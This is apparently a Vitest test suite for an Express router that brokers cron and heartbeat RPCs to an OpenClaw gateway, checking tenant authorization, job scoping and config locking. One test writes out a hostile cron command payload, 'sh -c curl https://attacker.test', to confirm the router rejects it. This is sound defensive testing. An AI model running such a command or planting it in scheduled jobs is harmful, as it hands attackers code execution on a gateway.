import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import express from "express";
import request from "supertest";
import { afterEach, describe, expect, it, vi } from "vitest";
import { acquireSystemConfigMutationLease } from "@octogee/core/system-config-mutation-lease";
import type { UpstreamRpcClient } from "../chat-proxy/openclaw/bridge-upstream-rpc.js";

import {
  createAutomationsRouter,
  invokeLocalOpenClaw,
  type LocalAutomationOpenClawDeps,
} from "./automations.js";

const dirs: string[] = [];

afterEach(() => {
  for (const dir of dirs.splice(0)) fs.rmSync(dir, { recursive: true, force: true });
});

function appForTest(overrides: Partial<Parameters<typeof createAutomationsRouter>[0]> = {}) {
  const openclawDir = fs.mkdtempSync(path.join(os.tmpdir(), "automations-route-"));
  dirs.push(openclawDir);
  const defaultInvoke = vi.fn(async (method: string) => {
    if (method === "config.get") {
      return {
        hash: "config-hash",
        config: {
          agents: {
            list: [{
              id: "octogee-alice-coach",
              heartbeat: { every: "30m", target: "last", directPolicy: "allow" },
            }],
          },
        },
      };
    }
    return { jobs: [] };
  });
  const invoke = overrides.invoke ?? defaultInvoke;
  const app = express();
  app.use(express.json());
  app.use((req, _res, next) => {
    req.uid = "builder-uid";
    next();
  });
  app.use(
    "/api/g/:gatewayId/automations",
    createAutomationsRouter({
      authorizeOwner: async () => ({
        kind: "authorized",
        slug: "alice",
        gatewayId: "gw-alice",
        coachChannelId: "mm-coach-alice",
      }),
      localGatewayId: () => "gw-alice",
      openclawDir: () => openclawDir,
      invoke,
      ...overrides,
    }),
  );
  return { app, invoke, openclawDir };
}

describe("automations locality broker", () => {
  it("forwards the Firebase bearer to the tenant-bound authorization broker before OpenClaw", async () => {
    const authorizeOwner = vi.fn(async () => ({
      kind: "authorized" as const,
      slug: "alice",
      gatewayId: "gw-alice",
      coachChannelId: "mm-coach-alice",
    }));
    const { app } = appForTest({ authorizeOwner });

    await request(app)
      .post("/api/g/gw-alice/automations/rpc")
      .set("Authorization", "Bearer caller-token")
      .send({ method: "cron.list" })
      .expect(200);

    expect(authorizeOwner).toHaveBeenCalledWith({
      gatewayId: "gw-alice",
      authorization: "Bearer caller-token",
      uid: "builder-uid",
    });
  });

  it("does not invoke OpenClaw when the platform broker denies workspace ownership", async () => {
    const { app, invoke } = appForTest({
      authorizeOwner: vi.fn(async () => ({ kind: "forbidden" as const })),
    });

    const response = await request(app)
      .post("/api/g/gw-alice/automations/rpc")
      .set("Authorization", "Bearer caller-token")
      .send({ method: "cron.list" });

    expect(response.status).toBe(403);
    expect(response.body).toEqual({ error: "forbidden" });
    expect(invoke).not.toHaveBeenCalled();
  });

  it("preserves the not-ready coach channel state without invoking OpenClaw", async () => {
    const { app, invoke } = appForTest({
      authorizeOwner: vi.fn(async () => ({ kind: "coach_channel_not_ready" as const })),
    });

    const response = await request(app)
      .post("/api/g/gw-alice/automations/rpc")
      .send({ method: "cron.list" });

    expect(response.status).toBe(409);
    expect(response.body).toEqual({ error: "coach_channel_not_ready" });
    expect(invoke).not.toHaveBeenCalled();
  });

  it("lists only cron jobs scoped to the authenticated Builder's coach", async () => {
    const { app, invoke } = appForTest();

    const response = await request(app)
      .post("/api/g/gw-alice/automations/rpc")
      .send({ method: "cron.list", params: { includeDisabled: false } });

    expect(response.status).toBe(200);
    expect(response.body).toEqual({ result: { jobs: [] } });
    expect(invoke).toHaveBeenCalledWith("cron.list", {
      agentId: "octogee-alice-coach",
      includeDisabled: true,
      limit: 200,
      sortBy: "updatedAtMs",
      sortDir: "desc",
    });
  });

  it("projects cron listing responses to A2-safe agent-turn jobs", async () => {
    const safeJob = {
      id: "daily-digest",
      agentId: "octogee-alice-coach",
      name: "Daily digest",
      enabled: true,
      schedule: { kind: "every", everyMs: 60_000 },
      sessionTarget: "isolated",
      wakeMode: "now",
      payload: { kind: "agentTurn", message: "Summarize the day." },
      delivery: { mode: "webhook", to: "https://secret.example/hook" },
      state: { nextRunAtMs: 1_783_820_800_000, lastRunStatus: "ok" },
    };
    const { app } = appForTest({
      invoke: vi.fn(async (method: string) => {
        if (method === "cron.list") {
          return {
            jobs: [
              safeJob,
              {
                ...safeJob,
                id: "morning-brief",
                delivery: {
                  mode: "announce",
                  channel: "mattermost",
                  accountId: "alice-coach",
                  to: "channel:mm-coach-alice",
                },
              },
              { ...safeJob, id: "legacy-command", payload: { kind: "command", argv: ["env"] } },
            ],
            deliveryPreviews: { "daily-digest": { detail: "https://secret.example/hook" } },
          };
        }
        return { jobs: [] };
      }),
    });

    const response = await request(app)
      .post("/api/g/gw-alice/automations/rpc")
      .send({ method: "cron.list" });

    expect(response.body).toEqual({
      result: {
        jobs: [{
          id: "daily-digest",
          name: "Daily digest",
          enabled: true,
          schedule: { kind: "every", everyMs: 60_000 },
          sessionTarget: "isolated",
          wakeMode: "now",
          payload: { kind: "agentTurn", message: "Summarize the day." },
          delivery: { mode: "none" },
          state: { nextRunAtMs: 1_783_820_800_000, lastRunStatus: "ok" },
        }, {
          id: "morning-brief",
          name: "Daily digest",
          enabled: true,
          schedule: { kind: "every", everyMs: 60_000 },
          sessionTarget: "isolated",
          wakeMode: "now",
          payload: { kind: "agentTurn", message: "Summarize the day." },
          delivery: { mode: "announce", channel: "mattermost", to: "channel:coach" },
          state: { nextRunAtMs: 1_783_820_800_000, lastRunStatus: "ok" },
        }],
      },
    });
  });

  it.each(["cron.get", "cron.remove"])("rejects unsupported browser operation %s without invoking OpenClaw", async (method) => {
    const { app, invoke } = appForTest();

    const response = await request(app)
      .post("/api/g/gw-alice/automations/rpc")
      .send({ method, params: { id: "daily-digest" } });

    expect(response.status).toBe(400);
    expect(response.body).toEqual({ error: "unsupported automation operation" });
    expect(invoke).not.toHaveBeenCalled();
  });

  it("rejects command payloads instead of lending the gateway's operator authority", async () => {
    const { app, invoke } = appForTest();

    const response = await request(app)
      .post("/api/g/gw-alice/automations/rpc")
      .send({
        method: "cron.add",
        params: {
          name: "Take over the pod",
          enabled: true,
          schedule: { kind: "every", everyMs: 60_000 },
          payload: { kind: "command", argv: ["sh", "-c", "curl https://attacker.test"] },
        },
      });

    expect(response.status).toBe(400);
    expect(invoke).not.toHaveBeenCalled();
  });

  it("forces new cron jobs onto the caller's coach with the A2 delivery contract", async () => {
    const { app, invoke } = appForTest();

    const response = await request(app)
      .post("/api/g/gw-alice/automations/rpc")
      .send({
        method: "cron.add",
        params: {
          name: "Daily digest",
          enabled: true,
          schedule: { kind: "every", everyMs: 60_000 },
          sessionTarget: "main",
          wakeMode: "next-heartbeat",
          payload: { kind: "agentTurn", message: "Summarize the day." },
          delivery: { mode: "announce", channel: "slack", to: "#outside" },
        },
      });

    expect(response.status).toBe(200);
    expect(invoke).toHaveBeenCalledWith("cron.add", {
      agentId: "octogee-alice-coach",
      name: "Daily digest",
      enabled: true,
      schedule: { kind: "every", everyMs: 60_000 },
      sessionTarget: "isolated",
      wakeMode: "now",
      payload: { kind: "agentTurn", message: "Summarize the day." },
      delivery: {
        mode: "announce",
        channel: "mattermost",
        accountId: "alice-coach",
        to: "channel:mm-coach-alice",
      },
    });
  });

  it("retargets delivery edits to the authoritative coach channel", async () => {
    const current = {
      id: "daily-digest",
      agentId: "octogee-alice-coach",
      name: "Daily digest",
      enabled: true,
      schedule: { kind: "every", everyMs: 60_000 },
      payload: { kind: "agentTurn", message: "Summarize the day." },
      delivery: { mode: "none" },
    };
    const { app, invoke } = appForTest({
      authorizeOwner: vi.fn(async () => ({
        kind: "authorized" as const,
        slug: "alice",
        gatewayId: "gw-alice",
        coachChannelId: "mm-coach-broker",
      })),
      invoke: vi.fn(async (method: string) => method === "cron.get" ? { job: current } : { ok: true }),
    });

    const response = await request(app)
      .post("/api/g/gw-alice/automations/rpc")
      .send({
        method: "cron.update",
        params: {
          id: "daily-digest",
          patch: { delivery: { mode: "announce", channel: "slack", to: "#outside" } },
        },
      });

    expect(response.status).toBe(200);
    expect(invoke).toHaveBeenCalledWith("cron.update", {
      id: "daily-digest",
      patch: {
        delivery: {
          mode: "announce",
          channel: "mattermost",
          accountId: "alice-coach",
          to: "channel:mm-coach-broker",
        },
      },
    });
  });

  it("refuses operations on a cron job outside the caller's coach", async () => {
    const { app, invoke } = appForTest({
      invoke: vi.fn(async (method: string) => {
        if (method === "cron.get") return { job: { id: "foreign-job", agentId: "another-agent" } };
        return { ok: true };
      }),
    });

    const response = await request(app)
      .post("/api/g/gw-alice/automations/rpc")
      .send({ method: "cron.run", params: { id: "foreign-job", mode: "force" } });

    expect(response.status).toBe(404);
    expect(invoke).toHaveBeenCalledWith("cron.get", { id: "foreign-job" });
    expect(invoke).not.toHaveBeenCalledWith("cron.run", expect.anything());
  });

  it("refuses to rewrite an unsupported existing job into an agent turn", async () => {
    const { app, invoke } = appForTest({
      invoke: vi.fn(async (method: string) => {
        if (method === "cron.get") {
          return {
            job: {
              id: "legacy-command",
              agentId: "octogee-alice-coach",
              payload: { kind: "command", argv: ["echo", "legacy"] },
            },
          };
        }
        return { ok: true };
      }),
    });

    const response = await request(app)
      .post("/api/g/gw-alice/automations/rpc")
      .send({
        method: "cron.update",
        params: {
          id: "legacy-command",
          patch: { payload: { kind: "agentTurn", message: "A new prompt" } },
        },
      });

    expect(response.status).toBe(404);
    expect(invoke).not.toHaveBeenCalledWith("cron.update", expect.anything());
  });

  it("refuses a mismatched gateway before it can reach OpenClaw", async () => {
    const { app, invoke } = appForTest();

    const response = await request(app)
      .post("/api/g/gw-someone-else/automations/rpc")
      .send({ method: "cron.list" });

    expect(response.status).toBe(404);
    expect(invoke).not.toHaveBeenCalled();
  });

  it("does not turn the Automations surface into an arbitrary gateway RPC proxy", async () => {
    const { app, invoke } = appForTest();

    const response = await request(app)
      .post("/api/g/gw-alice/automations/rpc")
      .send({ method: "config.patch", params: { raw: "{}" } });

    expect(response.status).toBe(400);
    expect(invoke).not.toHaveBeenCalled();
  });

  it("reads the caller's coach heartbeat from its hash-bound config snapshot", async () => {
    const { app, invoke } = appForTest();

    const response = await request(app)
      .post("/api/g/gw-alice/automations/rpc")
      .send({ method: "heartbeat.get" });

    expect(response.status).toBe(200);
    expect(response.body).toEqual({
      result: {
        hash: "config-hash",
        heartbeat: { every: "30m", target: "last" },
      },
    });
    expect(invoke).toHaveBeenCalledWith("config.get", {});
  });

  it("hash-CAS patches only the caller's coach heartbeat", async () => {
    const { app, invoke } = appForTest({
      invoke: vi.fn(async () => ({ ok: true, hash: "next-hash" })),
    });

    const response = await request(app)
      .post("/api/g/gw-alice/automations/rpc")
      .send({
        method: "heartbeat.update",
        baseHash: "before-hash",
        heartbeat: {
          every: "60m",
          prompt: "Check the release queue.",
          target: "last",
          lightContext: true,
        },
      });

    expect(response.status).toBe(200);
    expect(invoke).toHaveBeenCalledWith("config.patch", {
      raw: JSON.stringify({
        agents: {
          list: [{
            id: "octogee-alice-coach",
            heartbeat: {
              every: "60m",
              prompt: "Check the release queue.",
              target: "last",
              lightContext: true,
            },
          }],
        },
      }),
      baseHash: "before-hash",
    });
  });

  it("rejects heartbeat updates while the durable config writer lock is busy", async () => {
    const { app, invoke, openclawDir } = appForTest();
    const held = await acquireSystemConfigMutationLease({ openclawDir });
    expect(held.ok).toBe(true);

    const response = await request(app)
      .post("/api/g/gw-alice/automations/rpc")
      .send({
        method: "heartbeat.update",
        baseHash: "before-hash",
        heartbeat: { every: "60m" },
      });

    expect(response.status).toBe(500);
    expect(invoke).not.toHaveBeenCalled();
    if (held.ok) await held.lease.release();
  });

  it("applies heartbeat updates through a leftover roll-era freeze marker — the freeze plane is retired", async () => {
    const { app, invoke, openclawDir } = appForTest();
    fs.writeFileSync(path.join(openclawDir, "system_config.freeze.json"), JSON.stringify({
      migrationId: "mig-1",
      slug: "alice",
      directoryMode: 0o700,
      configMode: 0o600,
    }));

    const response = await request(app)
      .post("/api/g/gw-alice/automations/rpc")
      .send({
        method: "heartbeat.update",
        baseHash: "before-hash",
        heartbeat: { every: "60m" },
      });

    expect(response.status).toBe(200);
    expect(invoke).toHaveBeenCalledWith("config.patch", expect.anything());
  });

  it("holds the durable writer lease through the awaited heartbeat patch", async () => {
    let resolvePatch: ((value: { ok: true; hash: string }) => void) | undefined;
    const invoke = vi.fn(() => new Promise<{ ok: true; hash: string }>((resolve) => {
      resolvePatch = resolve;
    }));
    const { app, openclawDir } = appForTest({ invoke });

    const pending = request(app)
      .post("/api/g/gw-alice/automations/rpc")
      .send({
        method: "heartbeat.update",
        baseHash: "before-hash",
        heartbeat: { every: "60m" },
      })
      .then((response) => response);
    await vi.waitFor(() => expect(invoke).toHaveBeenCalled());
    await expect(acquireSystemConfigMutationLease({ openclawDir })).resolves.toEqual({
      ok: false,
      code: "writer-lock-busy",
    });
    resolvePatch?.({ ok: true, hash: "next-hash" });
    expect((await pending).status).toBe(200);
    const after = await acquireSystemConfigMutationLease({ openclawDir });
    expect(after.ok).toBe(true);
    if (after.ok) await after.lease.release();
  });

  it.each(["accountId", "to", "model", "session"])(
    "rejects sensitive heartbeat field %s outside the Automation editor contract",
    async (field) => {
      const { app, invoke } = appForTest();

      const response = await request(app)
        .post("/api/g/gw-alice/automations/rpc")
        .send({
          method: "heartbeat.update",
          baseHash: "before-hash",
          heartbeat: { every: "60m", [field]: "attacker-controlled" },
        });

      expect(response.status).toBe(400);
      expect(invoke).not.toHaveBeenCalled();
    },
  );

  it("rejects heartbeat fields outside the narrow Automation editor contract", async () => {
    const { app, invoke } = appForTest();

    const response = await request(app)
      .post("/api/g/gw-alice/automations/rpc")
      .send({
        method: "heartbeat.update",
        baseHash: "before-hash",
        heartbeat: { every: "60m", dangerousGatewaySetting: true },
      });

    expect(response.status).toBe(400);
    expect(invoke).not.toHaveBeenCalled();
  });
});

describe("local Automations OpenClaw transport", () => {
  it("uses the auth-rotating upstream and closes it after the bounded RPC", async () => {
    const close = vi.fn();
    const dispose = vi.fn();
    const openAuthenticatedUpstream = vi.fn(async () => ({ close } as never));
    const rpc: UpstreamRpcClient = {
      call: async <T>() => ({ ok: true as const, result: { jobs: [] } as T }),
      dispose,
    };
    const attachRpcClient = vi.fn(() => rpc);
    const deps: LocalAutomationOpenClawDeps = {
      gatewayId: () => "eggman-devdays",
      gatewayUrl: () => "http://127.0.0.1:18789",
      openAuthenticatedUpstream,
      attachRpcClient,
    };

    await expect(invokeLocalOpenClaw("cron.list", {}, deps)).resolves.toEqual({ jobs: [] });

    expect(openAuthenticatedUpstream).toHaveBeenCalledWith({
      gatewayId: "eggman-devdays",
      url: "http://127.0.0.1:18789",
      timeoutMs: 10_000,
    });
    expect(attachRpcClient).toHaveBeenCalledWith(expect.anything(), { timeoutMs: 10_000 });
    expect(dispose).toHaveBeenCalledTimes(1);
    expect(close).toHaveBeenCalledTimes(1);
  });
});
